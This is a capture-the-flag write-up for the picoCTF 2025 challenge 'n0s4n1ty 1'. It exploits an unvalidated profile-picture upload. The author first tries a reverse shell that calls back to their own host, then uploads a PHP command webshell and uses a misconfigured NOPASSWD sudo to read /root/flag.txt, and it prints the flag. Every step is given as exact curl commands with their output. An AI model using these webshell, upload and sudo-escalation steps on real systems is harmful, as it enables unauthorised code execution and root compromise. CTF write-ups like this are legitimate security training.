# n0s4n1ty 1

- **Platform:** picoCTF 2025
- **Difficulty:** Easy
- **Date completed:** 2026-10-22
- **Category:** Web Exploitation

## Summary
A profile picture upload form accepts arbitrary file types with no validation, allowing a PHP webshell to be uploaded and executed directly. From there, `www-data` turns out to have passwordless `sudo` access to everything, making full root-level file read trivial.

## Steps
1. Loaded the site and found a profile picture upload form (`multipart/form-data` POST to `upload.php`), with a `fileToUpload` file input and a `submit` button.
2. Confirmed the field name by inspecting the form's HTML source — the upload endpoint errors with "Undefined array key 'fileToUpload'" when that exact field isn't present, confirming the required POST field name.
3. **First attempt — reverse shell (failed):** Grabbed the stock `php-reverse-shell.php` from Kali's built-in webshell collection (`/usr/share/webshells/php/`), edited `$ip`/`$port` to point at a local interface, and uploaded/triggered it:
   ```
   curl -F "fileToUpload=@execute.php" http://xebec.cylabacademy.net:45019/upload.php
   curl http://xebec.cylabacademy.net:45019/uploads/execute.php
   ```
   This consistently returned `fsockopen(): Unable to connect ... Connection timed out`. The root cause: the IP used was a private VPN-tunnel address (`192.168.153.x`, from a personal VPN's `tun0` interface), which has no public route back from picoCTF's hosted challenge container — the reverse shell's outbound connection attempt had nowhere real to go. No amount of IP/port correctness on the PHP side could fix this, since the problem was network routing, not code.
4. **Pivoted to a non-interactive webshell instead**, which requires no outbound/inbound connectivity at all — Kali's `simple-backdoor.php`, which runs a shell command passed via GET/POST and echoes the output straight back in the HTTP response:
   ```
   cp /usr/share/webshells/php/simple-backdoor.php .
   curl -F "fileToUpload=@simple-backdoor.php" http://xebec.cylabacademy.net:45019/upload.php
   ```
   Uploaded successfully to `uploads/simple-backdoor.php`.
5. Confirmed code execution:
   ```
   curl "http://xebec.cylabacademy.net:45019/uploads/simple-backdoor.php?cmd=id"
   ```
   → `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
6. Tried reading the flag directly as `www-data` first — came back empty, meaning no read permission at that privilege level:
   ```
   curl "http://xebec.cylabacademy.net:45019/uploads/simple-backdoor.php?cmd=cat+/root/flag.txt"
   ```
7. Checked for `sudo` privileges:
   ```
   curl "http://xebec.cylabacademy.net:45019/uploads/simple-backdoor.php?cmd=sudo+-l"
   ```
   Result: `www-data` can run `(ALL) NOPASSWD: ALL` — i.e. run literally anything as root with no password.
8. Used that to read the flag as root:
   ```
   curl "http://xebec.cylabacademy.net:45019/uploads/simple-backdoor.php?cmd=sudo+cat+/root/flag.txt"
   ```
   Returned the flag directly in the response.

## Tools used
- `curl` — all interaction with the upload form and the deployed webshell, no browser needed
- `/usr/share/webshells/php/` (Kali's pre-bundled webshells) — both `php-reverse-shell.php` (ultimately unusable here) and `simple-backdoor.php` (the one that worked)

## Lesson learned
A reverse shell needs a genuinely reachable callback address — a private/VPN-internal IP is useless to a remote target with no route into that tunnel, no matter how correct the rest of the payload is. When connectivity is uncertain or unavailable, a non-interactive command-execution webshell is a strictly simpler and more reliable alternative for proving and using RCE, since it rides entirely on the existing inbound HTTP request/response rather than requiring any new outbound connection. Also: always check `sudo -l` once you have any code execution — a misconfigured `NOPASSWD: ALL` turns a low-privilege web user into full root access instantly.

## Flag
```
academy{wh47_c4n_u_d0_wPHP_5a6e18b0}
```